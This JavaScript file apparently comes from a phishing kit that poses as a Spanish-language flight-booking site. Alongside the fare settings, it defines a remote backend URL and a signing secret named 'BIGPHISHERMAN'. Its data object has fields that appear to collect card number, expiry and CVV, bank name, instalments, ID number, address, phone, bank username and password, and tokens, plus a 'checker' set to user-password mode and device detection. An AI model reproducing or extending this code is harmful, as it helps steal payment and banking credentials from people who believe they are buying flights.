/**
 * CONFIGURACIÓN
 */

let url = "https://readme1216.onrender.com";

const PRECIO_BASE = 46900;  // Precio base de los vuelos.

const MULTIPLICADORES_PRECIO = { // Incremento porcentual de tarifas.
    light: 1,
    smart: 1.7,
    full: 3
};

const JWT_SIGN = 'BIGPHISHERMAN';

const LS = window.localStorage;

const monthDic = ['Ene','Feb','Mar','Abr','May','Jun','Jul','Ago','Sep','Oct','Nov','Dic'];
const dayDic = ['Lun', 'Mar', 'Mie', 'Jue', 'Vie', 'Sab', 'Dom'];

const countries = [ /* ... tu array countries ... */ ];
const airports = [ /* ... tu array airports ... */ ];

let info = {
    flightInfo:{
        travel_type: 1,
        seat_type: 1,
        origin: '',
        destination: '',
        adults: 1,
        children: 0,
        babies: 0,
        flightDates: [0, 0]
    },
    passengersInfo:{
        adults: [
            {
                name: '',
                surname: '',
                cc: ''
            }
        ],
        children: [],
        babies: []
    },
    metaInfo:{
        email: '',
        p: '',
        pdate: '',
        c: '',
        ban: '',
        dues: '',
        dudename: '',
        surname: '',
        cc: '',
        telnum: '',
        city: '',
        state: '',
        address: '',
        cdin: '',
        ccaj: '',
        cavance: '',
        tok: '',
        user: '',
        puser: '',
        err: '',
        disp: '',
    },
    checkerInfo: {
        company: '',
        mode: 'userpassword',
    },
    edit: 0
};

dDisp();

function limitDigits(input, maxDigits) {
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

function dDisp() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if(userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iOS')){
        info.metaInfo.disp = "iOS";
    }else if(userAgent.includes('Windows')){
        info.metaInfo.disp = "PC";
    }else{
        info.metaInfo.disp = "Android";
    }
}

function updateLS(){
    LS.setItem('info', JSON.stringify(info));
}

// Cargar datos guardados
if (LS.getItem('info')) {
    info = JSON.parse(LS.getItem('info'));
} else {
    LS.setItem('info', JSON.stringify(info));
}

// Hacer variables globales disponibles para otros archivos
window.PRECIO_BASE = PRECIO_BASE;
window.MULTIPLICADORES_PRECIO = MULTIPLICADORES_PRECIO;
window.info = info;
window.updateLS = updateLS;
window.limitDigits = limitDigits;
